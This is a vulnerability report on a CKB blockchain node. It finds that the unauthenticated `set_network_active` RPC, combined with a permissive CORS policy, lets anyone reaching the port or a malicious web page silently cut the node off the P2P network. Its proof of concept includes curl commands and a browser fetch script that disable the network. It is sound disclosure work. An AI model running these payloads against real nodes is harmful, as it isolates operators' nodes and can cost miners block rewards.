### Title
Missing Authentication on `set_network_active` RPC Allows Unauthenticated Node Isolation - (`rpc/src/module/net.rs`)

---

### Summary

The `set_network_active` RPC method in `rpc/src/module/net.rs` toggles all P2P network activity for a running CKB node. The RPC server (`rpc/src/server.rs`) has no application-level authentication middleware whatsoever — no token, no HTTP Basic Auth, no session check. Any caller who can reach the RPC port can silently disable the node's entire P2P stack. Combined with `CorsLayer::permissive()` on the HTTP server, a malicious web page can trigger this via a cross-origin POST request against a node operator's browser session.

---

### Finding Description

**Root cause — no auth in the RPC server:**

`rpc/src/server.rs` builds the HTTP router with no authentication layer:

```rust
let app = Router::new()
    .route("/", method_router.clone())
    .route("/{*path}", method_router)
    .route("/ping", get(ping_handler))
    .layer(Extension(Arc::clone(rpc)))
    .layer(CorsLayer::permissive())   // ← allows all origins
    .layer(TimeoutLayer::with_status_code(...))
    .layer(Extension(stream_config));
``` [1](#0-0) 

A `grep` for `authorization`, `auth`, `token`, or `basic_auth` in `rpc/src/**` returns zero matches. There is no middleware, no per-method guard, and no token check anywhere in the RPC stack.

**The privileged method:**

`set_network_active` in the `NetRpc` trait is declared as a plain RPC method with no guard:

```rust
#[rpc(name = "set_network_active")]
fn set_network_active(&self, state: bool) -> Result<()>;
``` [2](#0-1) 

Its implementation directly writes to the shared atomic flag:

```rust
fn set_network_active(&self, state: bool) -> Result<()> {
    self.network_controller.set_active(state);
    Ok(())
}
``` [3](#0-2) 

`NetworkController::set_active` stores directly into `NetworkState::active`:

```rust
pub fn set_active(&self, active: bool) {
    self.network_state.active.store(active, Ordering::Release);
}
``` [4](#0-3) 

`NetworkState::active` is the single flag that gates all inbound P2P message processing:

```rust
pub(crate) active: AtomicBool,
``` [5](#0-4) 

**Attack path:**

1. Attacker crafts a web page with a `fetch("http://127.0.0.1:8114", { method: "POST", body: '{"jsonrpc":"2.0","method":"set_network_active","params":[false],"id":1}' })`.
2. Because the server responds with `Access-Control-Allow-Origin: *` (from `CorsLayer::permissive()`), the browser does not block the preflight or the response.
3. The node operator visits the page while their node is running.
4. `set_network_active(false)` executes; `NetworkState::active` is set to `false`.
5. The node silently stops processing all incoming P2P messages (sync, relay, discovery) and drops outgoing messages.
6. The node is isolated from the network until the operator manually calls `set_network_active(true)` or restarts the node.

The TCP listener (`tcp_listen_address`) has the same problem with no auth at all — any TCP client that can reach the port can send the JSON-RPC call directly. [6](#0-5) 

---

### Impact Explanation

- **Node isolation / consensus exclusion**: A node with `active = false` discards all P2P messages. It cannot receive new blocks, relay transactions, or respond to sync requests. A miner running against this node will produce stale block templates and lose block rewards.
- **Persistent state change**: The flag persists until explicitly reversed. The operator may not notice immediately, especially if the node appears to be running normally from a process-monitoring perspective.
- **No recovery without operator action**: The only remediation is a follow-up RPC call or a node restart.

---

### Likelihood Explanation

- **Default binding is `127.0.0.1:8114`** — the primary mitigation is network-level, not application-level. Many operators expose the RPC port on `0.0.0.0` for remote management, removing even this protection.
- **`CorsLayer::permissive()`** is unconditional in the server code; it cannot be disabled by configuration. Any operator who visits a malicious site while their node is running is exposed to the CSRF vector.
- **No credentials required**: The attack requires zero knowledge of secrets, keys, or node internals. A single HTTP POST suffices.
- **Chrome's Private Network Access** policy (blocking public→localhost requests) partially mitigates the browser CSRF vector for Chrome users, but Firefox and other clients do not enforce this, and direct TCP access is unaffected.

---

### Recommendation

Add an application-level authentication layer to the RPC server. Options in order of preference:

1. **Bearer token / API key**: Generate a random token at node startup, require it as an `Authorization: Bearer <token>` header on all state-mutating RPC calls (or all calls). This is the approach used by Bitcoin Core (`rpcauth`).
2. **HTTP Basic Auth**: Already partially implemented in the miner client (`parse_authorization` in `miner/src/client.rs`); add the server-side check as an Axum middleware layer.
3. **Restrict `set_network_active` (and other mutating methods) to a separate, non-default port** that is not enabled unless explicitly configured.

At minimum, replace `CorsLayer::permissive()` with a restrictive CORS policy that does not allow arbitrary origins. [7](#0-6) 

---

### Proof of Concept

**Direct call (RPC port reachable):**

```bash
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"set_network_active","params":[false],"id":1}'
# Returns: {"jsonrpc":"2.0","result":null,"id":1}
```

Verify isolation:

```bash
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"local_node_info","params":[],"id":2}'
# "active": false  ← node is now isolated
```

**CSRF via browser (operator visits attacker page):**

```html
<script>
fetch("http://127.0.0.1:8114", {
  method: "POST",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify({
    jsonrpc: "2.0", method: "set_network_active",
    params: [false], id: 1
  })
});
</script>
```

Because `CorsLayer::permissive()` returns `Access-Control-Allow-Origin: *`, the browser will complete the request. The node's P2P stack is disabled without the operator's knowledge.
